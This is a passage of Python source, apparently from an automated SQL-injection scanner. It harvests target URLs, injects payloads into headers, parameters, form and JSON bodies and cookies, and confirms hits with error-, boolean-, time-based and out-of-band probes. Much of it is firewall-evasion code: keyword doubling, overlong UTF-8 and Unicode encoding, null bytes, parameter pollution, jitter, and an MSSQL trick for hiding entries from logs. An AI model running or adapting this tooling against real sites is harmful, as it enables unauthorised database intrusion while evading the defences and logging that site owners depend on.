        s = re.sub(r'(?i)\b' + k + r'\b',
                   lambda m: '/*!0{}*/'.format(m.group().upper()), s)
    return s

def _symboliclogical(s):
    """AND -> && , OR -> || (symbolic operator aliases)."""
    s = re.sub(r'(?i)\bAND\b', '&&', s)
    s = re.sub(r'(?i)\bOR\b',  '||', s)
    return s

def _equaltolike(s):
    """Replace = with LIKE in boolean conditions (bypasses equality checks)."""
    s = re.sub(r"(?<=['\d])\s*=\s*(?=['\d])", ' LIKE ', s)
    return s

def _greatest(s):
    """Replace > with GREATEST (comparison bypass for some WAF rules)."""
    s = re.sub(r'(?<![<>!])>(?![=>])', '>GREATEST', s)
    return s

def _least(s):
    """Replace > with LEAST() alternative comparison."""
    s = re.sub(r'(?<![<>!])>(?![=>])', ' LEAST(0,1) AND 1>', s)
    return s

def _nonrecursivereplacement(s):
    """Double-embed keywords so a single-pass WAF strip leaves the original.
    SELECT -> SELSELECTECT  (WAF strips 'SELECT' once, leaving 'SELECT')."""
    for k in sorted(_KW, key=len, reverse=True):
        mid = len(k) // 2
        doubled = k[:mid] + k + k[mid:]
        s = re.sub(r'(?i)\b' + k + r'\b', doubled, s)
    return s

def _randomcase(s):
    """True random (not alternating) case on each keyword character."""
    import random as _r
    def rep(m):
        return ''.join(c.upper() if _r.random() > 0.5 else c.lower()
                       for c in m.group())
    for k in _KW:
        s = re.sub(k, rep, s, flags=re.I)
    return s

def _uppercase(s):
    """Uppercase all SQL keywords."""
    for k in _KW:
        s = re.sub(r'(?i)\b' + k + r'\b', k.upper(), s)
    return s

def _lowercase(s):
    """Lowercase all SQL keywords."""
    for k in _KW:
        s = re.sub(r'(?i)\b' + k + r'\b', k.lower(), s)
    return s

def _charunicodeencode(s):
    """IIS/ASP Unicode encoding: ' -> %u0027 (bypasses ASCII-only WAF checks)."""
    result = []
    for c in s:
        if c.isalnum() or c in (' ', '\t'):
            result.append(c)
        else:
            result.append('%u{:04x}'.format(ord(c)))
    return ''.join(result)

def _charunicodeescape(s):
    r"""Unicode escape: ' -> \u0027 (for frameworks that unescape before SQL)."""
    result = []
    for c in s:
        if c.isalnum() or c in (' ', '\t'):
            result.append(c)
        else:
            result.append('\\u{:04x}'.format(ord(c)))
    return ''.join(result)

def _htmlencode(s):
    r"""HTML-encode non-alphanumeric chars: ' -> &#x27; (double-decode contexts)."""
    result = []
    for c in s:
        if c.isalnum() or c in (' ', '\t', '\n'):
            result.append(c)
        else:
            result.append('&#x{:02x};'.format(ord(c)))
    return ''.join(result)

def _overlongutf8(s):
    """Overlong UTF-8 encoding of non-alphanumeric chars.
    ' (0x27) -> %c0%a7 -- bypasses WAFs that validate ASCII range only."""
    result = []
    for c in s:
        o = ord(c)
        if c.isalnum() or c in (' ', '\t'):
            result.append(c)
        elif o < 0x80:
            # Overlong 2-byte: 0xc0 | (o >> 6), 0x80 | (o & 0x3f)
            b1 = 0xc0 | (o >> 6)
            b2 = 0x80 | (o & 0x3f)
            result.append('%{:02x}%{:02x}'.format(b1, b2))
        else:
            result.append(c)
    return ''.join(result)

def _appendnullbyte(s):
    """Append URL-encoded NULL byte: payload -> payload%00 (old IIS trick)."""
    return s + '%00'

def _percentage(s):
    """IIS/ASP.NET: inject % before each keyword char: SELECT -> %S%E%L%E%C%T."""
    def _pct(m):
        return ''.join('%' + c for c in m.group())
    for k in sorted(_KW, key=len, reverse=True):
        s = re.sub(r'(?i)\b' + k + r'\b', _pct, s)
    return s

def _sp_password(s):
    """MSSQL: append sp_password for automatic log obfuscation."""
    return s + '-- sp_password'

# Update level sets with the new functions
_LEVEL2 = _LEVEL1 + [_mysql_version_comment, _mysql_inline_bang,
                      _space2tab, _space2newline, _space2hash_newline,
                      _modsecurityzeroversioned, _space2randomblank,
                      _symboliclogical, _multiplespaces]
_LEVEL3 = _LEVEL2 + [_keyword_split, _urlencode_sql, _scientific_sep,
                      _randomcomments, _nonrecursivereplacement,
                      _charunicodeencode, _versionedmorekeywords,
                      _commentbeforeparentheses, _randomcase]
TAMPER_LEVELS = {1: _LEVEL1, 2: _LEVEL2, 3: _LEVEL3}

TAMPER_NAMES = {
    # --- space variants ---
    "space2comment":     _space2comment,
    "space2tab":         _space2tab,
    "space2newline":     _space2newline,
    "space2hash":        _space2hash_newline,
    "space2dash":        _space2dash,
    "space2plus":        _space2plus,
    "space2mssqlblank":  _space2mssqlblank,
    "space2mysqldash":   _space2mysqdash,
    "space2morecomment": _space2morecomment,
    "space2randomblank": _space2randomblank,
    "multiplespaces":    _multiplespaces,
    # --- case ---
    "mixcase":           _mixcase,
    "randomcase":        _randomcase,
    "uppercase":         _uppercase,
    "lowercase":         _lowercase,
    # --- comments / structure ---
    "randomcomments":    _randomcomments,
    "commentbeforeparens": _commentbeforeparentheses,
    "versioncomment":    _mysql_version_comment,
    "bangcomment":       _mysql_inline_bang,
    "versionedkeywords": _versionedkeywords,
    "versionedmore":     _versionedmorekeywords,
    "modsec0versioned":  _modsecurityzeroversioned,
    "kwsplit":           _keyword_split,
    # --- logic / comparison ---
    "symboliclogical":   _symboliclogical,
    "equaltolike":       _equaltolike,
    "greatest":          _greatest,
    "least":             _least,
    "between":           _between_replace,
    # --- encoding ---
    "urlencode":         _urlencode_sql,
    "dblurlencode":      _dbl_urlencode,
    "charunicodeencode": _charunicodeencode,
    "charunicodeescape": _charunicodeescape,
    "htmlencode":        _htmlencode,
    "overlongutf8":      _overlongutf8,
    "appendnullbyte":    _appendnullbyte,
    "percentage":        _percentage,
    # --- misc ---
    "scientific":        _scientific_sep,
    "nonrecursiverep":   _nonrecursivereplacement,
    "pgdollar":          _pg_dollar_quote,
    "sp_password":       _sp_password,
}

def tamper_variants(tpl, level=1, custom=None):
    """Apply tamper functions and return de-duped variant list."""
    funcs = list(custom) if custom else TAMPER_LEVELS.get(level, _LEVEL1)
    variants = [tpl]
    for fn in funcs:
        v = fn(tpl)
        if v and v != tpl:
            variants.append(v)
    # Also apply each function on top of the case-mixed base
    if _mixcase not in funcs:
        base2 = _mixcase(tpl)
    else:
        base2 = funcs[funcs.index(_mixcase)](tpl) if _mixcase in funcs else tpl
    for fn in funcs:
        if fn is _mixcase: continue
        v = fn(base2)
        if v and v not in variants:
            variants.append(v)
    return list(dict.fromkeys(v for v in variants if v))

def randomize_header_case(name: str) -> str:
    """Randomly alternate case on each character of a header name.
    Some WAFs inspect specific header names case-sensitively."""
    return "".join(ch.upper() if i%2 else ch.lower()
                   for i, ch in enumerate(name))

# --------------------------------------------------------------------------- #
# Data model
# --------------------------------------------------------------------------- #
@dataclass
class Target:
    url:     str
    method:  str  = "GET"
    body:    str  = ""
    extra_headers: dict = field(default_factory=dict)

@dataclass
class Surface:
    """One injectable point on a Target."""
    kind:     str    # SURF_*
    name:     str    # param name / header name / cookie name
    original: str    # original / benign value
    # extra context for discovered forms
    form_action: str  = ""
    form_method: str  = ""
    form_fields: dict = field(default_factory=dict)  # other fields -> value

    def inject(self, target: Target, payload: str):
        """Return (url, extra_hdrs, body) with payload injected at this surface.
        All other values are left at their originals."""
        url   = target.url
        hdrs  = {}
        body  = target.body or ""

        if self.kind == SURF_HEADER:
            hdrs[self.name] = benign_value(self.name) + payload

        elif self.kind == SURF_QUERY:
            sp = urlsplit(url)
            params = parse_qs(sp.query, keep_blank_values=True)
            if self.form_fields.get("_pollute"):
                # parameter pollution: keep original first, inject as second
                # some WAFs inspect only the first occurrence
                existing = params.get(self.name, [self.original])
                clean = urlencode({self.name: existing[0]})
                dirty = urlencode({self.name: payload})
                base_q = urlencode(
                    {k: v[0] for k, v in params.items() if k != self.name},
                    doseq=False)
                full = "&".join(p for p in [base_q, clean, dirty] if p)
                url = sp._replace(query=full.replace("%2A","*").replace("%2a","*")).geturl()
            else:
                params[self.name] = [payload]
                q = urlencode(params, doseq=True).replace("%2A","*").replace("%2a","*")
                url = sp._replace(query=q).geturl()

        elif self.kind == SURF_BODY_FORM:
            if self.form_action:
                url = self.form_action
            fields = dict(self.form_fields)
            fields[self.name] = payload
            body = urlencode(fields)
            hdrs["Content-Type"]   = "application/x-www-form-urlencoded"
            hdrs["Content-Length"] = str(len(body.encode()))

        elif self.kind == SURF_BODY_JSON:
            try:
                data = json.loads(body or "{}")
                keys = self.name.split(".")
                d = data
                for k in keys[:-1]:
                    d = d.setdefault(k, {})
                d[keys[-1]] = payload
                body = json.dumps(data)
                hdrs["Content-Type"]   = "application/json"
                hdrs["Content-Length"] = str(len(body.encode()))
            except Exception:
                pass

        elif self.kind == SURF_COOKIE:
            existing = target.extra_headers.get("Cookie","") or ""
            cookies  = {}
            for part in existing.split(";"):
                part = part.strip()
                if "=" in part:
                    k, v = part.split("=", 1)
                    cookies[k.strip()] = v.strip()
            cookies[self.name] = payload
            hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookies.items())

        return url, hdrs, body

    def marker_req(self, target: Target):
        """Return (url, extra_hdrs, body) with sqlmap * marker (no payload)."""
        # For headers inject() prepends benign value, so marker is just "*".
        # For params/body/cookie the original value is replaced, so original+"*".
        payload = "*" if self.kind == SURF_HEADER else self.original + "*"
        return self.inject(target, payload)

@dataclass
class Hit:
    host:      str
    url:       str
    method:    str
    surface:   str   # "header:User-Agent" / "query:id" / etc.
    technique: str   # time-based | bool-based | error-based | oob
    dbms:      str
    context:   str
    payload:   str
    baseline:  float = 0.0
    t_probe:   float = 0.0
    t_control: float = 0.0
    t_confirm: float = 0.0
    d1:        int   = 0
    d2:        int   = 0
    confidence: float = 0.0
    notes:     str   = ""
    reqfile:   str   = ""
    sqlmap:    str   = ""

# --------------------------------------------------------------------------- #
# Rate limiter + business-hours guard
# --------------------------------------------------------------------------- #
class HostRateLimiter:
    def __init__(self, rate):
        self.interval = (1.0/rate) if rate and rate > 0 else 0.0
        self.next, self.locks = {}, {}
    async def wait(self, host):
        if not self.interval: return
        lock = self.locks.setdefault(host, asyncio.Lock())
        async with lock:
            now = time.monotonic()
            nxt = self.next.get(host, 0.0)
            if nxt > now:
                await asyncio.sleep(nxt - now)
                now = time.monotonic()
            self.next[host] = max(now, nxt) + self.interval

def _in_business_hours(now):
    if now.weekday() >= 5: return False
    return 7 <= now.hour < 19

# --------------------------------------------------------------------------- #
# Harvesting
# --------------------------------------------------------------------------- #
def _run(cmd, feed=None, timeout=180):
    try:
        p = subprocess.run(cmd, input=feed, capture_output=True, text=True, timeout=timeout)
        return p.stdout or ""
    except Exception:
        return ""

def _host_only(s):
    s = s.strip()
    if s.startswith(("http://","https://")): return host_of(s)
    return s.split("/")[0].split("?")[0]

def _grep_urls(text): return re.findall(r"https?://[^\s\"'<>\]]+", text)

JS_EP_RE = re.compile(
    r"""["'`]("""
    r"""(?:https?://[^"'`\s]{6,})"""
    r"""|(?:/[a-zA-Z0-9_][a-zA-Z0-9_./?=&%~+-]{1,200})"""
    r"""|(?:\.{1,2}/[a-zA-Z0-9_./?=&%~+-]{2,200})"""
    r"""|(?:[a-zA-Z0-9_-]+/[a-zA-Z0-9_./?=&%~+-]{2,120})"""
    r""")["'`]""")

def _extract_js_endpoints(js_urls, base, args):
    eps = set()
    try:
        client = httpx.Client(verify=False, timeout=15, follow_redirects=True,
                              proxy=getattr(args,"proxy",None) or None)
    except Exception:
        return eps
    for j in list(js_urls)[:args.harvest_js_max]:
        try:
            r = client.get(j)
            if r.status_code != 200 and not j.lower().endswith(".js"): continue
            for m in JS_EP_RE.findall(r.text):
                u = m.strip()
                if any(c in u for c in " \t<>"): continue
                eps.add(u if u.startswith("http") else urljoin(base, u))
        except Exception:
            continue
    client.close()
    return eps

def harvest_domain(domain, args):
    host = _host_only(domain)
    base = f"https://{host}"
    urls, stats = set(), {}
    T = args.harvest_timeout
    D = str(args.harvest_depth)
    if shutil.which("waybackurls"):
        out = _run(["waybackurls"], feed=host, timeout=T)
        w = [l.strip() for l in out.splitlines() if l.startswith("http")]
        urls.update(w); stats["wb"] = len(w)
    if shutil.which("gau"):
        out = _run(["gau","--threads","5",host], timeout=T)
        g = [l.strip() for l in out.splitlines() if l.startswith("http")]
        urls.update(g); stats["gau"] = len(g)
    if not getattr(args,"passive_harvest",False):
        if shutil.which("katana"):
            out = _run(["katana","-u",base,"-d",D,"-jc","-silent"], timeout=T)
            k = [l.strip() for l in out.splitlines() if l.startswith("http")]
            urls.update(k); stats["katana"] = len(k)
        if shutil.which("gospider"):
            out = _run(["gospider","-s",base,"-d",D,"-q","-t","10"], timeout=T)
            gs = _grep_urls(out); urls.update(gs); stats["gospider"] = len(gs)
        if shutil.which("hakrawler"):
            out = _run(["hakrawler","-d",D,"-u"], feed=base, timeout=T)
            h = [l.strip() for l in out.splitlines() if l.startswith("http")]
            urls.update(h); stats["hak"] = len(h)
    if not getattr(args,"no_harvest_js",False):
        js_urls = {u for u in urls if urlsplit(u).path.lower().endswith(".js")}
        if js_urls:
            eps = _extract_js_endpoints(js_urls, base, args)
            urls.update(eps); stats["js"] = len(eps)
    rd = reg_domain(host)
    urls = {u for u in urls if u.startswith("http") and reg_domain(host_of(u)) == rd}
    if not urls:
        urls.update([base+"/", base+"/search?q=1", base+"/index.php",
                     base+"/api/v1/status", base+"/login"])
        stats["fallback"] = 5
    return urls, stats

def load_targets(path):
    if _is_burp_xml(path): return [], []
    domains, urls = [], []
    with open(path) as fh:
        for raw in fh:
            t = raw.strip()
            if not t or t.startswith("#"): continue
            if t.startswith(("http://","https://")): urls.append(t)
            elif "/" in t or "?" in t: urls.append("https://"+t)
            else: domains.append(t)
    return domains, urls

def _parse_request_text(raw, scheme="https", fallback_url=""):
    """Parse raw HTTP request text -> Target (shared by file + XML parsers)."""
    if not raw or not raw.strip(): return None
    raw = raw.strip()
    if "\r\n\r\n" in raw: head, _, body = raw.partition("\r\n\r\n")
    elif "\n\n" in raw:     head, _, body = raw.partition("\n\n")
    else:                      head, body = raw, ""
    lines = head.replace("\r\n","\n").split("\n")
    if not lines: return None
    parts = lines[0].split()
    if len(parts) < 2: return None
    method, pathq = parts[0].upper(), parts[1]
    if method not in ("GET","POST","PUT","PATCH","DELETE","HEAD","OPTIONS"):
        return None
    hdrs, host = {}, ""
    for ln in lines[1:]:
        if ":" not in ln: continue
        k, v = ln.split(":",1); k, v = k.strip(), v.strip()
        if k.lower() == "host": host = v; continue
        if k.lower() in ("content-length","connection","accept-encoding",
                          "transfer-encoding"): continue
        hdrs[k] = v
    if not host and not fallback_url: return None
    if pathq.startswith("http"): url = pathq
    elif host: url = f"{scheme}://{host}{pathq}"
    else: url = fallback_url
    return Target(url=url, method=method, body=body.strip(), extra_headers=hdrs)

def parse_request_file(path, scheme="https"):
    """Parse a saved raw HTTP request file -> Target."""
    try:
        raw = open(path, "r", errors="replace").read()
    except Exception:
        return None
    return _parse_request_text(raw, scheme)

def parse_burp_xml(path, scheme="https"):
    """Auto-detect and parse a Burp Suite XML export.
    Decodes base64 <request> elements and returns a list of Targets."""
    import xml.etree.ElementTree as ET, base64
    targets = []
    try:
        tree = ET.parse(path)
        root = tree.getroot()
        items = (root.findall("item") if root.tag == "items" else
                 [root] if root.tag == "item" else root.findall(".//item"))
    except Exception as e:
        print(f"[!] Burp XML parse error: {e}")
        return targets
    for item in items:
        try:
            url = ""
            url_el = item.find("url")
            if url_el is not None and url_el.text:
                url = url_el.text.strip()
            if not url:
                proto = (item.findtext("protocol") or scheme).strip()
                host  = (item.findtext("host") or "").strip()
                port  = (item.findtext("port") or "").strip()
                path  = (item.findtext("path") or "/").strip()
                url   = (f"{proto}://{host}:{port}{path}"
                         if port and port not in ("80","443")
                         else f"{proto}://{host}{path}")
            if not url or not url.startswith("http"): continue
            req_el = item.find("request")
            if req_el is not None and req_el.text and req_el.text.strip():
                raw = req_el.text.strip()
                if req_el.get("base64","false").lower() == "true":
                    try: raw = base64.b64decode(raw).decode("utf-8","replace")
                    except Exception: raw = ""
                if raw:
                    tg = _parse_request_text(raw, scheme, fallback_url=url)
                    if tg: targets.append(tg); continue
            method = (item.findtext("method") or "GET").strip().upper()
            targets.append(Target(url=url, method=method))
        except Exception:
            continue
    return targets

def _is_burp_xml(path):
    try:
        head = open(path,"r",errors="replace").read(512).lstrip()
        return (head.startswith("<?xml") or "<items " in head
                or "<item>" in head or "burpVersion" in head)
    except Exception:
        return False

# --------------------------------------------------------------------------- #
# HTML form parser
# --------------------------------------------------------------------------- #
class _FormParser(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base_url = base_url
        self.forms = []
        self._cur = None

    def handle_starttag(self, tag, attrs):
        a = {k.lower(): (v or "") for k, v in attrs}
        if tag == "form":
            action = a.get("action","")
            if action:
                action = urljoin(self.base_url, action)
            else:
                action = self.base_url
            self._cur = {"action": action,
                         "method": a.get("method","GET").upper(),
                         "fields": {}}
            self.forms.append(self._cur)
        elif tag in ("input","textarea","select") and self._cur is not None:
            ftype = a.get("type","text").lower()
            name  = a.get("name","").strip()
            value = a.get("value","")
            if name and ftype not in SKIP_INPUT_TYPES:
                if name.lower() not in CSRF_NAMES:
                    self._cur["fields"][name] = value

    def handle_endtag(self, tag):
        if tag == "form":
            self._cur = None

def _parse_forms(html, base_url):
    p = _FormParser(base_url)
    try:
        p.feed(html)
    except Exception:
        pass
    return p.forms

# --------------------------------------------------------------------------- #
# Surface extraction
# --------------------------------------------------------------------------- #
def extract_surfaces(target: Target, active_surfaces: set,
                     max_params: int) -> list:
    """Return all injectable surfaces for a target."""
    surfs = []

    # ---- headers ----
    if SURF_HEADER in active_surfaces:
        # Filled in by caller (header list varies per run)
        pass  # handled separately in test_target for header iteration

    # ---- query params ----
    if SURF_QUERY in active_surfaces:
        sp = urlsplit(target.url)
        params = parse_qs(sp.query, keep_blank_values=True)
        for name, vals in list(params.items())[:max_params]:
            if name.lower() in CSRF_NAMES: continue
            surfs.append(Surface(SURF_QUERY, name, vals[0]))

    # ---- body: form-encoded ----
    ct = target.extra_headers.get("Content-Type","").lower()
    if SURF_BODY_FORM in active_surfaces and target.body:
        if "application/x-www-form-urlencoded" in ct or (
                "json" not in ct and "xml" not in ct and "=" in target.body):
            try:
                params = parse_qs(target.body, keep_blank_values=True)
                for name, vals in list(params.items())[:max_params]:
                    if name.lower() in CSRF_NAMES: continue
                    surfs.append(Surface(SURF_BODY_FORM, name, vals[0]))
            except Exception:
                pass

    # ---- body: JSON ----
    if SURF_BODY_JSON in active_surfaces and target.body and "json" in ct:
        try:
            data = json.loads(target.body)
            def _walk(obj, prefix=""):
                if isinstance(obj, dict):
                    for k, v in obj.items():
                        _walk(v, f"{prefix}.{k}" if prefix else k)
                elif isinstance(obj, (str, int, float)):
                    key = prefix
                    if key.lower() not in CSRF_NAMES:
                        surfs.append(Surface(SURF_BODY_JSON, key, str(obj)))
            _walk(data)
            surfs = surfs[:max_params + len(surfs) - max_params]  # cap
        except Exception:
            pass

    # ---- cookies ----
    if SURF_COOKIE in active_surfaces:
        cookie_hdr = target.extra_headers.get("Cookie","") or ""
        for part in cookie_hdr.split(";"):
            part = part.strip()
            if "=" not in part: continue
            k, v = part.split("=",1)
            k = k.strip()
            if k.lower() not in CSRF_NAMES:
                surfs.append(Surface(SURF_COOKIE, k, v.strip()))

    return surfs

# --------------------------------------------------------------------------- #
# Filtering
# --------------------------------------------------------------------------- #
DYNAMIC_HINTS = (".php",".asp",".aspx",".jsp",".do",".cgi","/api","/v1",
                 "/v2","/graphql","/rest","/ajax","/search","/login","/auth")
def prioritize(urls, max_per_host):
    by_host, seen = {}, set()
    for u in urls:
        if is_static(u): continue
        h = host_of(u)
        if not h: continue
        sp = urlsplit(u); key = f"{h}{sp.path}"
        if key in seen: continue
        seen.add(key); by_host.setdefault(h,[]).append(u)
    def score(u):
        s = 0; sp = urlsplit(u)
        if sp.query: s += 3
        if any(k in u.lower() for k in DYNAMIC_HINTS): s += 2
        if sp.path in ("","/"): s += 1
        return -s
    picked = []
    for h, g in by_host.items():
        roots = [u for u in g if urlsplit(u).path in ("","/")]
        rest  = sorted([u for u in g if u not in roots], key=score)
        picked.extend((roots[:1]+rest)[:max_per_host])
    return picked

def in_scope(url, suffixes, res):
    h = host_of(url).split(":")[0]
    if any(h == s or h.endswith("."+s) for s in suffixes): return True
    if any(rx.search(url) for rx in res): return True
    return not suffixes and not res

# --------------------------------------------------------------------------- #
# HTTP helpers
# --------------------------------------------------------------------------- #
async def _send_raw(client, method, url, headers, body, timeout, args,
                    close=False):
    rl = getattr(args,"_rate",None)
    if rl: await rl.wait(host_of(url))
    if getattr(args,"jitter",0):
        await asyncio.sleep(random.uniform(0, args.jitter))
    hdrs = dict(headers)
    if close: hdrs["Connection"] = "close"
    t0 = time.perf_counter()
    try:
        r = await client.request(method, url, headers=hdrs,
                                 content=body.encode() if body else None,
                                 timeout=timeout)
        return time.perf_counter()-t0, r.status_code, len(r.content)
    except Exception:
        return None, None, None

async def send_baseline(client, target, timeout, args):
    hdrs = {**BENIGN, **target.extra_headers, **getattr(args,"_auth",{})}
    return await _send_raw(client, target.method, target.url, hdrs,
                           target.body or "", timeout, args)

async def send_surface(client, target, surf, payload, timeout, args,
                       close=False):
    url, extra, body = surf.inject(target, payload)
    hdrs = {**BENIGN, **target.extra_headers, **getattr(args,"_auth",{}),
            **extra}
    method = surf.form_method or target.method
    return await _send_raw(client, method, url, hdrs, body, timeout, args,
                           close)

def _count_status(state, host, status):
    if status is None: return
    c = state["status"].setdefault(host, {"total":0,"blocked":0})
    c["total"] += 1
    if status in (403,429) or status >= 500: c["blocked"] += 1

# --------------------------------------------------------------------------- #
# Detection sequences
# --------------------------------------------------------------------------- #
async def probe_time(client, target, surf, tpl, args, baseline, jitter,
                     close=False):
    """Time-based: probe -> control -> confirm. Returns (t1,t0,t2,conf) or None."""
    d1, d2 = args.delay, args.delay2
    tmo    = d2 + 20
    thresh = max(d1 * args.candidate_factor, jitter*3 + 0.4)

    t1, _, _ = await send_surface(client, target, surf, tpl.format(d=d1), tmo, args, close)
    if t1 is None or (t1-baseline) < thresh: return None

    t0, _, _ = await send_surface(client, target, surf, tpl.format(d=0),  tmo, args, close)
    if t0 is None or (t0-baseline) >= d1*0.5: return None

    t2, _, _ = await send_surface(client, target, surf, tpl.format(d=d2), tmo, args, close)
    if t2 is None: return None
    if not ((t2-baseline) >= d2*args.candidate_factor and
            (t2-t1) >= (d2-d1)*0.5): return None

    conf = min(1.0,(((t1-baseline)/d1)+((t2-baseline)/d2))/2)
    return (t1, t0, t2, conf)

async def probe_bool(client, target, surf, true_tpl, false_tpl, args,
                     baseline, base_len):
    """Boolean-based: true/false pair -> status or length diff."""
    tmo = 20
    _, st, tlen = await send_surface(client, target, surf, true_tpl,  tmo, args)
    _, sf, flen = await send_surface(client, target, surf, false_tpl, tmo, args)
    if st is None or sf is None: return None
    status_diff = st != sf
    if tlen and flen and base_len:
        len_diff = abs(tlen-flen)/max(base_len,1) > 0.15 and abs(tlen-base_len)/max(base_len,1) < 0.10
    else:
        len_diff = False
    if not status_diff and not len_diff: return None
    note = (f"true({st}/{tlen}B) vs false({sf}/{flen}B) "
            f"({'status+len' if status_diff and len_diff else 'status' if status_diff else 'length'} diff)")
    return note

async def _send_surface_body(client, target, surf, payload, timeout, args):
    """Like send_surface but also returns response body text."""
    rl = getattr(args,"_rate",None)
    if rl: await rl.wait(host_of(target.url))
    if getattr(args,"jitter",0):
        await asyncio.sleep(random.uniform(0, args.jitter))
    url, extra, body = surf.inject(target, payload)
    hdrs = {**BENIGN, **target.extra_headers, **getattr(args,"_auth",{}), **extra}
    method = surf.form_method or target.method
    t0 = time.perf_counter()
    try:
        r = await client.request(method, url, headers=hdrs,
                                 content=body.encode() if body else None, timeout=timeout)
        elapsed = time.perf_counter() - t0
        text = r.text[:8192]  # cap to avoid huge memory use
        return elapsed, r.status_code, len(r.content), text
    except Exception:
        return None, None, None, ""

def _has_sql_error(text):
    """Return matched signature string if SQL error found in body, else None."""
    tl = text.lower()
    for sig in ERROR_SIGNATURES:
        if sig.lower() in tl:
            return sig
    return None

async def probe_error(client, target, surf, args):
    """Error-based: ' vs '' status/length diff + body SQL-error signature scan."""
    tmo = 20
    _, s1, l1, body1 = await _send_surface_body(client, target, surf, "'",  tmo, args)
    _, s2, l2, body2 = await _send_surface_body(client, target, surf, "''", tmo, args)
    if s1 is None or s2 is None: return None
    # rate-limit guard: 429 on either means timing noise, not SQL error
    if s1 in (429,) or s2 in (429,): return None
    status_diff = s1 != s2
    len_diff = (l1 is not None and l2 is not None and
                max(l1,l2,1) > 0 and
                abs(l1-l2)/max(l1,l2,1) > 0.30)
    # body signature: error on unbalanced quote but not on balanced
    sig1 = _has_sql_error(body1)
    sig2 = _has_sql_error(body2)
    sig_diff = sig1 is not None and sig2 is None
    if not status_diff and not len_diff and not sig_diff: return None
    reasons = []
    if status_diff: reasons.append(f"status {s1}!={s2}")
    if len_diff:    reasons.append(f"len {l1}B!={l2}B")
    if sig_diff:    reasons.append(f"SQL error in body: {sig1!r}")
    note = (f"single-quote vs balanced: {', '.join(reasons)}")
    return note

async def probe_active_error(client, target, surf, payload_tpl, args):
    """Send an active error-provoking payload, scan body for SQL error strings."""
    tmo = 20
    payload = payload_tpl  # no {d} substitution needed for error payloads
    _, status, length, body = await _send_surface_body(
        client, target, surf, payload, tmo, args)
    if status is None: return None
    if status in (429,): return None
    sig = _has_sql_error(body)
    if not sig: return None
    return f"SQL error in body ({sig!r}) — status={status} len={length}B"

# --------------------------------------------------------------------------- #
# Main per-target test
# --------------------------------------------------------------------------- #
async def test_target(client, target, header_names, time_payloads_h,
                      time_payloads_p, bool_payloads, oob_payloads_h,
                      oob_payloads_p, args, state, progress):
    host = host_of(target.url)

    # ---- baseline ----
    samples, statuses, lengths = [], [], []
    for _ in range(args.baseline_samples):
        e, s, l = await send_baseline(client, target, args.delay2+20, args)
        _count_status(state, host, s)
        if e is not None: samples.append(e)
        if s is not None: statuses.append(s)
        if l is not None: lengths.append(l)

    if len(samples) < 2:
        progress["done"] += 1; return
    baseline  = median(samples)
    jitter    = max(samples) - min(samples)
    base_len  = int(median(lengths)) if lengths else 0
    timing_ok = baseline <= args.max_baseline

    # Drop 404/410 baseline
    if args.skip_404 and statuses and Counter(statuses).most_common(1)[0][0] in (404,410):
        state["skipped_404"] += 1
        progress["done"] += 1; return

    # ---- build all surfaces for this target ----
    # Headers are always surface-1 (iterated by name)
    all_surfs: list[Surface] = []
    if SURF_HEADER in state["active_surfaces"]:
        for h in header_names:
            all_surfs.append(Surface(SURF_HEADER, h, benign_value(h)))
    # Param surfaces
    all_surfs += extract_surfaces(target, state["active_surfaces"], args.max_params)

    # ---- test each surface ----
    for surf in all_surfs:
        surf_key = f"{surf.kind}:{surf.name}"
        hit_key  = (host, surf_key)

        if args.stop_on_hit and hit_key in state["confirmed"]:
            continue

        # ---- error-based: diff probe ----
        if args.error_probe and surf.kind != SURF_COOKIE:
            note = await probe_error(client, target, surf, args)
            if note:
                _emit(Hit(host=host, url=target.url, method=target.method,
                          surface=surf_key, technique="error-based",
                          dbms="", context="sq", payload="' vs ''",
                          confidence=0.5, notes=note),
                      surf, target, args, state)

        # ---- error-based: active payloads (EXTRACTVALUE/CONVERT/CAST) ----
        if args.error_probe and surf.kind != SURF_COOKIE:
            for dbms, ctx, tpl in state.get("active_error_payloads", []):
                if args.stop_on_hit and (host, surf_key, "error-based") in state["emitted"]:
                    break
                note = await probe_active_error(client, target, surf, tpl, args)
                if note:
                    _emit(Hit(host=host, url=target.url, method=target.method,
                              surface=surf_key, technique="error-based",
                              dbms=dbms, context=ctx, payload=tpl,
                              confidence=0.7, notes=note),
                          surf, target, args, state)
                    break  # one confirmed error-based hit per surface is enough

        # ---- boolean-based (params only, fast) ----
        if args.bool_probe and surf.kind != SURF_HEADER:
            for dbms, ctx, tp_t, tp_f in bool_payloads:
                if args.stop_on_hit and hit_key in state["confirmed"]: break
                note = await probe_bool(client, target, surf, tp_t, tp_f,
                                        args, baseline, base_len)
                if note:
                    _emit(Hit(host=host, url=target.url, method=target.method,
                              surface=surf_key, technique="bool-based",
                              dbms=dbms, context=ctx,
                              payload=f"true:{tp_t} / false:{tp_f}",
                              confidence=0.55, notes=note),
                          surf, target, args, state)
                    if args.stop_on_hit: break

        # ---- time-based ----
        if timing_ok:
            tpayloads = (time_payloads_h if surf.kind == SURF_HEADER
                         else time_payloads_p)
            for dbms, ctx, tpl in tpayloads:
                if args.stop_on_hit and hit_key in state["confirmed"]: break
                res = await probe_time(client, target, surf, tpl,
                                       args, baseline, jitter)
                if not res: continue
                ok = True
                for _ in range(args.verify_hits):
                    if not await probe_time(client, target, surf, tpl,
                                            args, baseline, jitter, close=True):
                        ok = False; break
                if not ok: continue
                t1, t0, t2, conf = res
                _emit(Hit(host=host, url=target.url, method=target.method,
                          surface=surf_key, technique="time-based",
                          dbms=dbms, context=ctx, payload=tpl.format(d=args.delay),
                          baseline=round(baseline,2), t_probe=round(t1,2),
                          t_control=round(t0,2), t_confirm=round(t2,2),
                          d1=args.delay, d2=args.delay2, confidence=round(conf,2)),
                      surf, target, args, state)
                if args.stop_on_hit: break

        # ---- OOB ----
        if args.collab and not (args.stop_on_hit and hit_key in state["confirmed"]):
            oob_list = (oob_payloads_h if surf.kind == SURF_HEADER
                        else oob_payloads_p)
            for dbms, ctx, tpl in oob_list:
                token = f"{state['oob_idx']:05x}{random.randint(0,0xffff):04x}"
                state["oob_idx"] += 1
                sub   = f"{token}.{args.collab}"
                await send_surface(client, target, surf, tpl.format(c=sub), 20, args)
                _log_oob(args, {"token":token,"subdomain":sub,"host":host,
                                "url":target.url,"method":target.method,
                                "surface":surf_key,"dbms":dbms,"context":ctx,
                                "payload":tpl.format(c=sub),"body":target.body,
                                "time":datetime.now().isoformat(timespec="seconds")})

    # ---- discovered forms (opt-in) ----
